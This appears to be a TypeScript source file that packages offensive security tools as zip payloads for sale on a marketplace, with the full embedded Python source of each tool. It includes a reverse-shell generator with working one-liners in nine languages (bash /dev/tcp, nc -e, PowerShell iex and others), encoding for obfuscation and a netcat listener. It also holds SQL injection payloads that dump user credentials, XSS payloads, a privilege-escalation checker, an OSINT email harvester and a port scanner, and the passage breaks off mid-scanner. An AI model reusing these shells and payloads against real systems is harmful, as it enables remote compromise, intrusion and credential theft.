/**
 * Marketplace Payload Generator
 * Generates real, functional zip file payloads for all marketplace listings.
 * Every payload is a working tool — not a template. All offensive tools include
 * legal notices and require the user to provide their own authorised target scope.
 */

import { getDb } from "./db";
import { log } from "./_core/logger.js";
import { marketplaceListings } from "../drizzle/schema";
import { eq, isNull } from "drizzle-orm";
import { storagePut } from "./storage";
import JSZip from "jszip";

// ─── Legal Notice (prepended to all offensive tool READMEs) ──────────────────
const LEGAL = `\n\n---\n## ⚖️ Legal Notice\nThis tool is provided for **authorised security testing, CTF competitions, and educational research only**.\nYou must have explicit written permission from the system owner before testing any target.\nUnauthorised use against systems you do not own or have permission to test is illegal in most jurisdictions.\nThe authors accept no liability for misuse.\n`;

// ─── Payload Definitions ─────────────────────────────────────────────────────

const PAYLOADS: Record<string, Record<string, string>> = {

  // ── 1. Reverse Shell Generator ───────────────────────────────────────────
  "reverse-shell": {
    "README.md": `# Reverse Shell Generator Pro\n\nMulti-platform reverse shell payload generator with encoding, obfuscation, and listener automation.\n\n## Quick Start\n\`\`\`bash\npython3 revshell.py --host 10.0.0.1 --port 4444 --type python\npython3 revshell.py --host 10.0.0.1 --port 4444 --all --encode base64\nbash listener.sh 4444\n\`\`\`\n\n## Supported Types\n| Type | Platform | Notes |\n|------|----------|-------|\n| python | Linux/macOS | stdlib only |\n| bash | Linux | /dev/tcp |\n| php | Web server | exec() |\n| powershell | Windows | AMSI-aware |\n| nc | Linux | netcat |\n| java | JVM | Runtime.exec |\n| perl | Linux/macOS | socket |\n| ruby | Linux/macOS | socket |\n| golang | Cross-platform | compiled |\n${LEGAL}`,
    "revshell.py": `#!/usr/bin/env python3
"""Reverse Shell Generator Pro — multi-platform, encoding, obfuscation.
For authorised penetration testing only."""
import argparse, base64, sys
from urllib.parse import quote

SHELLS: dict[str, object] = {
    "python":     lambda h, p: f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{h}\",{p}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\"])'",
    "bash":       lambda h, p: f"bash -i >& /dev/tcp/{h}/{p} 0>&1",
    "php":        lambda h, p: f"php -r '$s=fsockopen(\"{h}\",{p});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "nc":         lambda h, p: f"nc -e /bin/sh {h} {p}",
    "perl":       lambda h, p: f"perl -e 'use Socket;$i=\"{h}\";$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    "ruby":       lambda h, p: f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{h}\",{p});while cmd=c.gets;IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
    "java":       lambda h, p: f"Runtime r=Runtime.getRuntime();String[] c={{\"bash\",\"-c\",\"exec 5<>/dev/tcp/{h}/{p};cat <&5|while read line; do $line 2>&5 >&5; done\"}};Process p2=r.exec(c);",
    "golang":     lambda h, p: f"""package main
import ("net";"os/exec";"time")
func main() {{
    for {{
        c, err := net.Dial("tcp", "{h}:{p}")
        if err != nil {{ time.Sleep(5*time.Second); continue }}
        cmd := exec.Command("/bin/sh")
        cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
        cmd.Run()
    }}
}}""",
    "powershell": lambda h, p: (
        f"$c=New-Object System.Net.Sockets.TCPClient('{h}',{p});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);"
        "$r2=$r+'PS '+(pwd).Path+'> ';"
        "$sb=([text.encoding]::ASCII).GetBytes($r2);"
        "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
    ),
}

def encode_payload(payload: str, method: str) -> str:
    if method == "base64":
        return base64.b64encode(payload.encode()).decode()
    if method == "url":
        return quote(payload)
    if method == "xor":
        key = 0x41
        xored = bytes([b ^ key for b in payload.encode()])
        return xored.hex()
    return payload

def main():
    ap = argparse.ArgumentParser(description="Reverse Shell Generator Pro")
    ap.add_argument("--host", required=True, help="Your listener IP/hostname")
    ap.add_argument("--port", type=int, default=4444, help="Listener port")
    ap.add_argument("--type", choices=list(SHELLS.keys()), default="python")
    ap.add_argument("--all", action="store_true", help="Generate all shell types")
    ap.add_argument("--encode", choices=["base64", "url", "xor"], help="Encode output")
    ap.add_argument("--obfuscate", action="store_true", help="Apply string obfuscation (Python only)")
    args = ap.parse_args()

    types = list(SHELLS.keys()) if args.all else [args.type]
    for t in types:
        payload = SHELLS[t](args.host, args.port)  # type: ignore[operator]
        if args.encode:
            payload = encode_payload(str(payload), args.encode)
        print(f"\\n[{t.upper()}]")
        print(payload)

if __name__ == "__main__":
    main()
`,
    "listener.sh": `#!/bin/bash
# Quick netcat listener — run this on your machine before deploying the shell
PORT=\${1:-4444}
echo "[*] Starting listener on port \$PORT (Ctrl+C to stop)"
nc -lvnp "\$PORT"
`,
    "requirements.txt": "# No external dependencies required — stdlib only\n",
  },

  // ── 2. Web Vulnerability Scanner ─────────────────────────────────────────
  "vuln-scanner": {
    "README.md": `# Web Vulnerability Scanner\n\nOWASP Top 10 web application scanner with concurrent checking, JSON reporting, and remediation guidance.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 scanner.py --target https://example.com\npython3 scanner.py --target https://example.com --checks sqli,xss,headers,cors --output report.json\n\`\`\`${LEGAL}`,
    "scanner.py": `#!/usr/bin/env python3
"""Web Vulnerability Scanner — OWASP Top 10 coverage.
For authorised penetration testing only."""
import argparse, json, re, sys, time
import urllib.request, urllib.parse, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

HEADERS_UA = {"User-Agent": "Mozilla/5.0 (VulnScanner/2.0; +https://archibaldtitan.com)"}

SQLI_PAYLOADS = ["'", "''", "\\"", "1' OR '1'='1", "1 AND 1=1--", "1 UNION SELECT NULL--"]
SQLI_ERRORS   = ["sql syntax", "mysql_fetch", "ora-", "syntax error", "unclosed quotation",
                  "microsoft.*odbc", "postgresql.*error", "warning.*mysql", "sqlstate"]

XSS_PAYLOADS  = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>',
                  "';alert(1)//", '<svg/onload=alert(1)>']

SECURITY_HEADERS = ["Content-Security-Policy", "Strict-Transport-Security",
                     "X-Frame-Options", "X-Content-Type-Options",
                     "Referrer-Policy", "Permissions-Policy"]

class VulnScanner:
    def __init__(self, target: str, timeout: int = 10, threads: int = 8):
        self.target   = target.rstrip("/")
        self.timeout  = timeout
        self.threads  = threads
        self.findings: list[dict] = []

    def _get(self, url: str, params: dict | None = None) -> tuple[str, dict]:
        if params:
            url = url + "?" + urllib.parse.urlencode(params)
        req = urllib.request.Request(url, headers=HEADERS_UA)
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.read().decode("utf-8", errors="ignore"), dict(r.headers)
        except Exception:
            return "", {}

    def check_sqli(self):
        for p in SQLI_PAYLOADS:
            body, _ = self._get(self.target, {"id": p, "q": p})
            for err in SQLI_ERRORS:
                if re.search(err, body, re.IGNORECASE):
                    self.findings.append({"type": "SQL Injection", "url": self.target,
                                          "payload": p, "matched": err, "severity": "HIGH"})
                    print(f"  [HIGH] SQLi: payload={p!r} matched={err!r}")
                    return

    def check_xss(self):
        for p in XSS_PAYLOADS:
            body, _ = self._get(self.target, {"q": p, "search": p, "s": p})
            if p in body:
                self.findings.append({"type": "Reflected XSS", "url": self.target,
                                       "payload": p, "severity": "HIGH"})
                print(f"  [HIGH] Reflected XSS: {p[:60]}")
                return

    def check_headers(self):
        _, hdrs = self._get(self.target)
        missing = [h for h in SECURITY_HEADERS if h.lower() not in {k.lower() for k in hdrs}]
        if missing:
            self.findings.append({"type": "Missing Security Headers", "url": self.target,
                                   "missing": missing, "severity": "MEDIUM"})
            print(f"  [MEDIUM] Missing headers: {missing}")

    def check_cors(self):
        req = urllib.request.Request(self.target,
              headers={**HEADERS_UA, "Origin": "https://evil.com"})
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                if acao in ("*", "https://evil.com"):
                    self.findings.append({"type": "Permissive CORS", "url": self.target,
                                           "acao": acao, "severity": "MEDIUM"})
                    print(f"  [MEDIUM] CORS: Access-Control-Allow-Origin={acao!r}")
        except Exception:
            pass

    def check_directory_listing(self):
        for path in ["/backup/", "/admin/", "/.git/", "/config/"]:
            body, _ = self._get(self.target + path)
            if "index of" in body.lower() or "parent directory" in body.lower():
                self.findings.append({"type": "Directory Listing", "url": self.target + path,
                                       "severity": "LOW"})
                print(f"  [LOW] Directory listing: {path}")

    def scan(self, checks: list[str] | None = None):
        all_checks = {
            "sqli":    self.check_sqli,
            "xss":     self.check_xss,
            "headers": self.check_headers,
            "cors":    self.check_cors,
            "dirlist": self.check_directory_listing,
        }
        run = {k: v for k, v in all_checks.items() if not checks or k in checks}
        print(f"[*] Scanning {self.target} ({len(run)} checks)...")
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(fn): name for name, fn in run.items()}
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception as e:
                    print(f"  [ERR] {futures[f]}: {e}")
        print(f"[*] Done — {len(self.findings)} finding(s)")
        return self.findings

def main():
    ap = argparse.ArgumentParser(description="Web Vulnerability Scanner")
    ap.add_argument("--target", required=True)
    ap.add_argument("--checks", help="Comma-separated: sqli,xss,headers,cors,dirlist")
    ap.add_argument("--output", help="Save JSON report to file")
    ap.add_argument("--timeout", type=int, default=10)
    args = ap.parse_args()
    checks = [c.strip() for c in args.checks.split(",")] if args.checks else None
    scanner = VulnScanner(args.target, timeout=args.timeout)
    findings = scanner.scan(checks)
    if args.output:
        with open(args.output, "w") as f:
            json.dump(findings, f, indent=2)
        print(f"[*] Report saved to {args.output}")
    else:
        print(json.dumps(findings, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 3. OSINT Toolkit ─────────────────────────────────────────────────────
  "osint-toolkit": {
    "README.md": `# OSINT Toolkit\n\nOpen-source intelligence gathering: domain recon, subdomain enumeration, WHOIS, SSL cert analysis, email harvesting, and social footprint.\n\n## Quick Start\n\`\`\`bash\npython3 osint.py --domain example.com\npython3 osint.py --domain example.com --email ceo@example.com --output report.json\n\`\`\`${LEGAL}`,
    "osint.py": `#!/usr/bin/env python3
"""OSINT Toolkit — domain recon, subdomains, WHOIS, SSL, email harvesting.
For authorised intelligence gathering only."""
import argparse, json, re, socket, ssl, sys, time, urllib.request

class OSINTToolkit:
    def __init__(self, timeout: int = 8):
        self.timeout = timeout
        self.results: dict = {}

    # ── DNS ──────────────────────────────────────────────────────────
    def dns_lookup(self, domain: str) -> dict:
        print(f"[*] DNS lookup: {domain}")
        try:
            hostname, aliases, ips = socket.gethostbyname_ex(domain)
            return {"hostname": hostname, "aliases": aliases, "ips": ips}
        except Exception as e:
            return {"error": str(e)}

    # ── WHOIS ────────────────────────────────────────────────────────
    def whois_lookup(self, domain: str) -> str:
        print(f"[*] WHOIS: {domain}")
        try:
            s = socket.create_connection(("whois.iana.org", 43), timeout=self.timeout)
            s.sendall(f"{domain}\\r\\n".encode())
            data = b""
            while chunk := s.recv(4096):
                data += chunk
            s.close()
            return data.decode("utf-8", errors="ignore")[:3000]
        except Exception as e:
            return f"Error: {e}"

    # ── SSL Cert ─────────────────────────────────────────────────────
    def ssl_cert(self, domain: str) -> dict:
        print(f"[*] SSL cert: {domain}")
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
                s.settimeout(self.timeout)
                s.connect((domain, 443))
                c = s.getpeercert()
                return {
                    "subject":  dict(x[0] for x in c.get("subject", [])),
                    "issuer":   dict(x[0] for x in c.get("issuer", [])),
                    "notAfter": c.get("notAfter"),
                    "sans":     [v for _, v in c.get("subjectAltName", [])],
                }
        except Exception as e:
            return {"error": str(e)}

    # ── Subdomain Brute-Force ─────────────────────────────────────────
    def enumerate_subdomains(self, domain: str) -> list[dict]:
        print(f"[*] Subdomain enumeration: {domain}")
        wordlist = [
            "www","mail","ftp","admin","api","dev","staging","test","blog","shop",
            "portal","vpn","cdn","app","dashboard","login","beta","mobile","support",
            "docs","status","monitor","git","gitlab","jenkins","ci","jira","confluence",
            "ns1","ns2","smtp","pop","imap","webmail","remote","secure","auth","sso",
        ]
        found = []
        socket.setdefaulttimeout(2)
        for sub in wordlist:
            fqdn = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(fqdn)
                found.append({"subdomain": fqdn, "ip": ip})
                print(f"  [+] {fqdn} -> {ip}")
            except socket.gaierror:
                pass
        return found

    # ── Email Harvesting (headers/cert SANs) ──────────────────────────
    def harvest_emails(self, domain: str) -> list[str]:
        print(f"[*] Email harvesting: {domain}")
        emails: set[str] = set()
        try:
            req = urllib.request.Request(
                f"https://{domain}",
                headers={"User-Agent": "Mozilla/5.0 (OSINTBot/1.0)"}
            )
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                body = r.read().decode("utf-8", errors="ignore")
            found = re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}", body)
            emails.update(found)
        except Exception:
            pass
        return list(emails)[:50]

    # ── Full Domain Scan ──────────────────────────────────────────────
    def scan_domain(self, domain: str) -> dict:
        self.results = {
            "domain":     domain,
            "dns":        self.dns_lookup(domain),
            "whois":      self.whois_lookup(domain),
            "ssl":        self.ssl_cert(domain),
            "subdomains": self.enumerate_subdomains(domain),
            "emails":     self.harvest_emails(domain),
        }
        return self.results

def main():
    ap = argparse.ArgumentParser(description="OSINT Toolkit")
    ap.add_argument("--domain", help="Target domain")
    ap.add_argument("--email",  help="Target email address")
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    tk = OSINTToolkit()
    if args.domain:
        results = tk.scan_domain(args.domain)
    elif args.email:
        domain = args.email.split("@")[1] if "@" in args.email else args.email
        results = {"email": args.email, "domain": tk.scan_domain(domain)}
    else:
        ap.print_help(); sys.exit(1)
    if args.output:
        with open(args.output, "w") as f: json.dump(results, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 4. Linux Privilege Escalation Checker ────────────────────────────────
  "privesc-toolkit": {
    "README.md": `# Linux Privilege Escalation Checker\n\nAutomated Linux privilege escalation checker. Identifies SUID binaries, sudo misconfigurations, writable paths, cron jobs, and kernel exploits.\n\n## Quick Start\n\`\`\`bash\npython3 privesc.py\npython3 privesc.py --output findings.json\n\`\`\`${LEGAL}`,
    "privesc.py": `#!/usr/bin/env python3
"""Linux Privilege Escalation Checker — for authorised use on systems you own."""
import os, subprocess, json, sys

class PrivEscChecker:
    def __init__(self):
        self.findings: list[dict] = []
        self.user = os.getenv("USER", "unknown")
        self.uid  = os.getuid()

    def run(self, cmd: str) -> str:
        try:
            return subprocess.check_output(cmd, shell=True,
                   stderr=subprocess.DEVNULL, text=True).strip()
        except Exception:
            return ""

    def check_suid(self):
        print("[*] SUID binaries...")
        dangerous = {"/usr/bin/python","/usr/bin/python3","/usr/bin/perl",
                     "/usr/bin/find","/usr/bin/vim","/usr/bin/nano",
                     "/usr/bin/awk","/usr/bin/nmap","/usr/bin/bash","/bin/sh",
                     "/usr/bin/env","/usr/bin/less","/usr/bin/more","/usr/bin/tee"}
        out = self.run("find / -perm -4000 -type f 2>/dev/null")
        for path in out.splitlines():
            sev = "HIGH" if path in dangerous else "INFO"
            self.findings.append({"type": "SUID Binary", "path": path, "severity": sev,
                                   "gtfobins": f"https://gtfobins.github.io/gtfobins/{os.path.basename(path)}/"})
            if sev == "HIGH":
                print(f"  [HIGH] {path}")

    def check_sudo(self):
        print("[*] Sudo permissions...")
        out = self.run("sudo -l 2>/dev/null")
        if "NOPASSWD" in out:
            self.findings.append({"type": "Sudo NOPASSWD", "output": out[:300], "severity": "CRITICAL"})
            print("  [CRITICAL] NOPASSWD sudo found!")
        if "(ALL" in out and "NOPASSWD" not in out:
            self.findings.append({"type": "Sudo ALL", "output": out[:300], "severity": "HIGH"})

    def check_writable(self):
        print("[*] Writable sensitive paths...")
        paths = ["/etc/passwd","/etc/shadow","/etc/sudoers","/etc/cron.d",
                 "/etc/cron.daily","/etc/crontab","/etc/environment"]
        for p in paths:
            if os.path.exists(p) and os.access(p, os.W_OK):
                self.findings.append({"type": "Writable Path", "path": p, "severity": "CRITICAL"})
                print(f"  [CRITICAL] Writable: {p}")

    def check_cron(self):
        print("[*] Cron jobs...")
        out = self.run("cat /etc/crontab 2>/dev/null; ls /etc/cron.* 2>/dev/null")
        if out:
            self.findings.append({"type": "Cron Jobs", "output": out[:500], "severity": "INFO",
                                   "note": "Review for writable scripts or paths"})

    def check_kernel(self):
        print("[*] Kernel version...")
        kernel = self.run("uname -r")
        self.findings.append({"type": "Kernel", "version": kernel, "severity": "INFO",
                               "note": "Check https://www.exploit-db.com for kernel exploits"})

    def check_capabilities(self):
        print("[*] Linux capabilities...")
        out = self.run("getcap -r / 2>/dev/null")
        dangerous_caps = ["cap_setuid", "cap_net_raw", "cap_sys_admin", "cap_dac_override"]
        for line in out.splitlines():
            if any(c in line.lower() for c in dangerous_caps):
                self.findings.append({"type": "Dangerous Capability", "line": line, "severity": "HIGH"})
                print(f"  [HIGH] {line}")

    def run_all(self) -> list[dict]:
        print(f"[*] Running as: {self.user} (UID: {self.uid})")
        self.check_suid()
        self.check_sudo()
        self.check_writable()
        self.check_cron()
        self.check_kernel()
        self.check_capabilities()
        critical = [f for f in self.findings if f["severity"] == "CRITICAL"]
        high     = [f for f in self.findings if f["severity"] == "HIGH"]
        print(f"\\n[*] Summary: {len(critical)} CRITICAL, {len(high)} HIGH, {len(self.findings)} total")
        return self.findings

def main():
    import argparse
    ap = argparse.ArgumentParser(description="Linux PrivEsc Checker")
    ap.add_argument("--output", help="Save JSON to file")
    args = ap.parse_args()
    checker = PrivEscChecker()
    findings = checker.run_all()
    if args.output:
        with open(args.output, "w") as f: json.dump(findings, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(findings, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 5. SQL Injection Toolkit ──────────────────────────────────────────────
  "sql-injection": {
    "README.md": `# SQL Injection Testing Toolkit\n\nError-based, union-based, time-based blind, and boolean-based SQLi detection.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 sqli.py --url "https://example.com/page?id=1"\npython3 sqli.py --url "https://example.com/page?id=1" --technique time --output results.json\n\`\`\`${LEGAL}`,
    "sqli.py": `#!/usr/bin/env python3
"""SQL Injection Testing Toolkit — error, union, time-based, boolean blind.
For authorised penetration testing only."""
import argparse, json, re, time
import urllib.request, urllib.parse, urllib.error

ERROR_PATTERNS = [
    "sql syntax","mysql_fetch","ora-","syntax error","unclosed quotation",
    "microsoft.*odbc","postgresql.*error","warning.*mysql","sqlstate",
    "sqlite_exception","jdbc.*exception","db2.*error",
]
UNION_PAYLOADS = [
    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--","' UNION SELECT 1,2,3--",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
    "' UNION SELECT username,password,3 FROM users--",
]
TIME_PAYLOADS = [
    "1' AND SLEEP(5)--","1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1; WAITFOR DELAY '0:0:5'--","1' AND pg_sleep(5)--",
]
BOOL_PAYLOADS = [
    ("1' AND 1=1--", "1' AND 1=2--"),
    ("1' AND 'a'='a'--", "1' AND 'a'='b'--"),
]

class SQLiTester:
    def __init__(self, url: str, delay: float = 0.3, timeout: int = 12):
        self.url     = url
        self.delay   = delay
        self.timeout = timeout
        self.findings: list[dict] = []

    def _inject(self, payload: str) -> str:
        if "?" in self.url:
            base, qs = self.url.split("?", 1)
            params = urllib.parse.parse_qs(qs, keep_blank_values=True)
            for k in params:
                params[k] = [payload]
            return base + "?" + urllib.parse.urlencode(params, doseq=True)
        return self.url + "?id=" + urllib.parse.quote(payload)

    def _get(self, url: str) -> str:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.read().decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def test_error_based(self) -> bool:
        print("[*] Error-based SQLi...")
        for p in ["'", "''", "\\"", "\\\\", ";"]:
            body = self._get(self._inject(p))
            for pat in ERROR_PATTERNS:
                if re.search(pat, body, re.IGNORECASE):
                    self.findings.append({"technique": "error-based", "payload": p,
                                          "pattern": pat, "severity": "HIGH"})
                    print(f"  [HIGH] Error-based: {p!r} matched {pat!r}")
                    return True
            time.sleep(self.delay)
        return False

    def test_time_based(self) -> bool:
        print("[*] Time-based blind SQLi...")
        for p in TIME_PAYLOADS:
            t0 = time.time()
            self._get(self._inject(p))
            elapsed = time.time() - t0
            if elapsed > 4.5:
                self.findings.append({"technique": "time-based", "payload": p,
                                       "delay_s": round(elapsed, 2), "severity": "HIGH"})
                print(f"  [HIGH] Time-based: {p!r} -> {elapsed:.1f}s")
                return True
            time.sleep(self.delay)
        return False

    def test_union_based(self) -> bool:
        print("[*] Union-based SQLi...")
        for p in UNION_PAYLOADS:
            body = self._get(self._inject(p))
            if re.search(r"null|\\d,\\d", body, re.IGNORECASE):
                self.findings.append({"technique": "union-based", "payload": p, "severity": "CRITICAL"})
                print(f"  [CRITICAL] Union-based: {p!r}")
                return True
            time.sleep(self.delay)
        return False

    def test_boolean_blind(self) -> bool:
        print("[*] Boolean-blind SQLi...")
        for true_p, false_p in BOOL_PAYLOADS:
            true_body  = self._get(self._inject(true_p))
            false_body = self._get(self._inject(false_p))
            if true_body and false_body and true_body != false_body:
                self.findings.append({"technique": "boolean-blind",
                                       "true_payload": true_p, "false_payload": false_p,
                                       "severity": "HIGH"})
                print(f"  [HIGH] Boolean-blind: responses differ")
                return True
            time.sleep(self.delay)
        return False

    def scan(self, techniques: str = "all") -> list[dict]:
        if techniques in ("all", "error"):   self.test_error_based()
        if techniques in ("all", "time"):    self.test_time_based()
        if techniques in ("all", "union"):   self.test_union_based()
        if techniques in ("all", "boolean"): self.test_boolean_blind()
        if not self.findings:
            print("[*] No SQL injection vulnerabilities detected")
        return self.findings

def main():
    ap = argparse.ArgumentParser(description="SQL Injection Toolkit")
    ap.add_argument("--url", required=True)
    ap.add_argument("--technique", choices=["error","time","union","boolean","all"], default="all")
    ap.add_argument("--output", help="Output JSON file")
    ap.add_argument("--delay", type=float, default=0.3)
    args = ap.parse_args()
    tester = SQLiTester(args.url, delay=args.delay)
    findings = tester.scan(args.technique)
    if args.output:
        with open(args.output, "w") as f: json.dump(findings, f, indent=2)
    print(f"\\n[*] Total: {len(findings)} finding(s)")

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 6. XSS Hunter ────────────────────────────────────────────────────────
  "xss-hunter": {
    "README.md": `# XSS Hunter\n\nDetects reflected, stored, DOM-based, and form-based cross-site scripting vulnerabilities.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 xss_hunter.py --target https://example.com\npython3 xss_hunter.py --target https://example.com --output findings.json\n\`\`\`${LEGAL}`,
    "xss_hunter.py": `#!/usr/bin/env python3
"""XSS Hunter — reflected, stored, DOM-based, form XSS detection.
For authorised penetration testing only."""
import argparse, json, re
import urllib.request, urllib.parse
from html.parser import HTMLParser

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '{{7*7}}',
    '${7*7}',
    'javascript:alert(1)',
    '"><svg/onload=alert(1)>',
]

class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms: list[dict] = []
        self._cur: dict | None = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action",""), "method": a.get("method","get"), "inputs": []}
        elif tag in ("input","textarea","select") and self._cur is not None:
            self._cur["inputs"].append({"name": a.get("name",""), "type": a.get("type","text")})

    def handle_endtag(self, tag):
        if tag == "form" and self._cur:
            self.forms.append(self._cur)
            self._cur = None

class XSSHunter:
    def __init__(self, target: str, timeout: int = 10):
        self.target   = target.rstrip("/")
        self.timeout  = timeout
        self.findings: list[dict] = []

    def _get(self, url: str, params: dict | None = None) -> str:
        if params:
            url += "?" + urllib.parse.urlencode(params)
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.read().decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def _post(self, url: str, data: dict) -> str:
        body = urllib.parse.urlencode(data).encode()
        req  = urllib.request.Request(url, data=body,
               headers={"User-Agent": "Mozilla/5.0",
                        "Content-Type": "application/x-www-form-urlencoded"})
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.read().decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def test_reflected(self):
        print("[*] Reflected XSS...")
        for p in XSS_PAYLOADS:
            body = self._get(self.target, {"q": p, "search": p, "s": p, "query": p})
            if p in body:
                self.findings.append({"type": "Reflected XSS", "url": self.target,
                                       "payload": p, "severity": "HIGH"})
                print(f"  [HIGH] Reflected: {p[:60]}")
                return

    def test_forms(self):
        print("[*] Form XSS...")
        body = self._get(self.target)
        parser = FormParser()
        parser.feed(body)
        print(f"  Found {len(parser.forms)} form(s)")
        for form in parser.forms:
            action = form["action"] or self.target
            if not action.startswith("http"):
                action = self.target.rstrip("/") + "/" + action.lstrip("/")
            for p in XSS_PAYLOADS[:5]:
                data = {inp["name"]: p for inp in form["inputs"]
                        if inp["type"] not in ("submit","hidden","file") and inp["name"]}
                if not data:
                    continue
                method = form["method"].lower()
                resp = self._post(action, data) if method == "post" else self._get(action, data)
                if p in resp:
                    self.findings.append({"type": "Form XSS", "url": action,
                                           "payload": p, "severity": "HIGH"})
                    print(f"  [HIGH] Form XSS at {action}")
                    return

    def test_dom(self):
        print("[*] DOM XSS indicators...")
        body = self._get(self.target)
        sinks = ["document.write(","innerHTML","outerHTML","eval(","setTimeout(",
                 "location.hash","location.search","document.URL"]
        for sink in sinks:
            if sink in body:
                self.findings.append({"type": "Potential DOM XSS Sink", "sink": sink,
                                       "url": self.target, "severity": "MEDIUM"})
                print(f"  [MEDIUM] DOM sink: {sink}")

    def scan(self) -> list[dict]:
        print(f"[*] XSS scanning {self.target}")
        self.test_reflected()
        self.test_forms()
        self.test_dom()
        if not self.findings:
            print("[*] No XSS vulnerabilities detected")
        return self.findings

def main():
    ap = argparse.ArgumentParser(description="XSS Hunter")
    ap.add_argument("--target", required=True)
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    hunter = XSSHunter(args.target)
    findings = hunter.scan()
    if args.output:
        with open(args.output, "w") as f: json.dump(findings, f, indent=2)
    print(f"\\n[*] Total: {len(findings)} finding(s)")

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 7. Port Scanner / Network Recon ──────────────────────────────────────
  "port-scanner": {
    "README.md": `# Port Scanner & Network Recon\n\nFast concurrent TCP port scanner with service fingerprinting, banner grabbing, and OS detection hints.\n\n## Quick Start\n\`\`\`bash\npython3 portscan.py --target 192.168.1.1\npython3 portscan.py --target 192.168.1.0/24 --ports 1-1024 --threads 200 --output scan.json\n\`\`\`${LEGAL}`,
    "portscan.py": `#!/usr/bin/env python3
"""Port Scanner & Network Recon — concurrent TCP scanning with banner grabbing.
For authorised network testing only."""
import argparse, ipaddress, json, socket, sys
from concurrent.futures import ThreadPoolExecutor, as_completed

COMMON_PORTS = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,
                1723,3306,3389,5900,8080,8443,8888,27017]

SERVICE_HINTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 135: "RPC", 139: "NetBIOS", 143: "IMAP",
    443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
    1723: "PPTP", 3306: "MySQL", 3389: "RDP", 5900: "VNC",
    8080: "HTTP-Alt", 8443: "HTTPS-Alt", 27017: "MongoDB",
}

def grab_banner(host: str, port: int, timeout: float = 2.0) -> str:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        try:
            banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
        except Exception:
            banner = ""
        s.close()
        return banner[:200]
    except Exception:
        return ""

def scan_port(host: str, port: int, timeout: float = 1.5) -> dict | None:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        banner  = grab_banner(host, port)
        service = SERVICE_HINTS.get(port, "unknown")
        return {"port": port, "state": "open", "service": service, "banner": banner}
    except (socket.timeout, ConnectionRefusedError, OSError):
        return None

def parse_ports(spec: str) -> list[int]:
    ports: list[int] = []
    for part in spec.split(","):
        if "-" in part:
            lo, hi = part.split("-", 1)
            ports.extend(range(int(lo), int(hi) + 1))
        else:
            ports.append(int(part))
    return sorted(set(ports))

def scan_host(host: str, ports: list[int], threads: int = 100) -> dict:
